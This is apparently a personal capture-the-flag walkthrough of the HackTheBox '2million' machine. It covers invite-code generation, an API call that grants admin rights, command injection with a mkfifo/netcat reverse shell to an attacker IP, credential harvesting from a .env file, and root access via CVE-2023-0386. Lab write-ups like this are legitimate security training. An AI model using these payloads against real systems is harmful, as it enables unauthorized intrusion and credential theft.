1. Scanning: 
	1. nmap: Nothing special came out of it, just a http port 80 open.![[Pasted image 20260203160845.png]]
	2. Using gobuster and dirsearch for enumeration, a few pages turned to be interesting such as the invite page. ![[Pasted image 20260203161050.png]]![[Pasted image 20260203161110.png]]
2. Interacting with the application
	1. From interacting with the application, a few things were suspicious.
		1. The login and register page had error displayed where the error message could be changed.
		2. The login page provided information about whether the user was found or not. 
		3. The registration page required a "Invite Code" while blocking from adding a code.
		4. The Invite page allowed the invitation code to be added.
	2. While using burp suite, the invite page html was showing about how the code is handled and a JavaScript file that did not seem normal![[Pasted image 20260203161659.png | 400]]
	3. Accessing the /js/inviteapi.min.js provided insight in how the invite code was generated.
	4. The application mentioned a function makeInviteCode(). From the console.log, I implemented a small code to execute it and it returned an encrypted text.
	5. ![[Pasted image 20260203162016.png]] 
	6. The encrypted text mention that the code is generated from "/api/v1/invite/how/to/generate"![[Pasted image 20260203161941.png]]
	7. The last function to retrieve a code![[Pasted image 20260203161923.png]]
	8. It returned "UkFRQkotTklaSkItN0hFMVctSEc0V0Y=", after decoding it returned "RAQBJ-NIZJB-7HE1W-HG4WF"
	9. The code allowed me to create an account and login.
3. Interacting with the application while signed in
	1. The page had one interesting point and it was on the /access page which allowed to download an openvpn.
	2. After analyzing the results on burp suite, it showed this path: "/api/v1/user/vpn/generate "
	3. I tried to change it to admin but it did not work
	4. I tried to enumerate it but nothing came out
	5. I then searched again /api/v1 and surprisingly when logged in, it showed all the admin endpoints. 
		1. /api/v1/admin/auth
		2. /api/v1/admin/vpn/generate
		3. /api/v1/admin/settings/update
	6. From the  /api/v1/admin/settings/update, I attempted to change the privileges of the account created.
		1. The following changed the account I previously created making it an admin
			1. curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=oa5e28dq4hul0d9os6rfkcdodq" --header "Content-Type: application/json" -v --data '{"email":"test@gmail.com","is_admin":1}'
			2. ![[Pasted image 20260203235843.png]]
	7. Followed by attempting to perform a command injection using the /api/v1/admin/vpn/generate
		1. When inputting the username with commands nothing was showing, including no errors
		2. Ended up doing a reverse shell using  
			1. curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
				--cookie "PHPSESSID=oa5e28dq4hul0d9os6rfkcdodq" \                        
				--header "Content-Type: application/json" \
				--data '{"username":"test; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.142 4444 >/tmp/f"}'
	8. **Important, to gain info on the parameters needed, I was sending empty json data which would create an error showing the missing field.**
	9. After assessing the shell, I search for credentials which was found from the .env file
	10. After gaining access to the admin accounts, I was able to retrieve the user.txt flag. 
	11. From that I searched for a way to escalate privileges but sudo is not allowed on the admin account. After searching I found /var/mail/admin which mentions the OverlayFS / FUSE vulnerability in the machine
	12. I found this CVE related to it: CVE-2023-0386 which I followed the instruction and was able to get root access.
